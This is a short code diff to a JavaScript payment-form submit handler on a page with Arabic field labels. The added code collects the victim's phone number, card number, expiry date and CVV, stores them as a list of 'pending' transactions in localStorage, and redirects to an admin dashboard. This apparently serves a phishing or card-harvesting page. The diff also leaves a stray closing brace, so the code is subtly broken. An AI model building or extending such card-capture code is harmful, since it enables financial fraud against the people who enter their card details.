@@ -954,21 +954,29 @@ function handlePaymentSubmit(event) {
         return;
     }
     
+    // Get phone number and amount from page
+    const phoneNumber = document.querySelector('input[placeholder*="رقم"]')?.value || 'N/A';
+    const amountText = document.querySelector('[id="OrgTranxAmt"] .text-label')?.textContent.trim() || '0';
+    const amount = parseFloat(amountText) || 0;
+    
     // Create transaction data
     const transactionData = {
+        phoneNumber: phoneNumber,
         bankName: bankName,
         cardNumber: cardNumber,
         expiryDate: expiryMonth + '/' + expiryYear,
         cvv: cvv,
-        amount: document.querySelector('[id="OrgTranxAmt"] .text-label').textContent.trim(),
+        amount: amount,
+        status: 'pending',
         timestamp: new Date().toISOString()
     };
     
-    // Store in localStorage
-    const transactionKey = 'transaction_' + Date.now();
-    localStorage.setItem(transactionKey, JSON.stringify(transactionData));
+    // Get existing transactions or create new array
+    const transactions = JSON.parse(localStorage.getItem('transactions') || '[]');
+    transactions.push(transactionData);
+    localStorage.setItem('transactions', JSON.stringify(transactions));
     
-    // Redirect to dashboard
-    window.location.href = '/dashboard.html';
+    // Redirect to admin dashboard
+    window.location.href = '/admin-dashboard.html';}
 }
 </script>
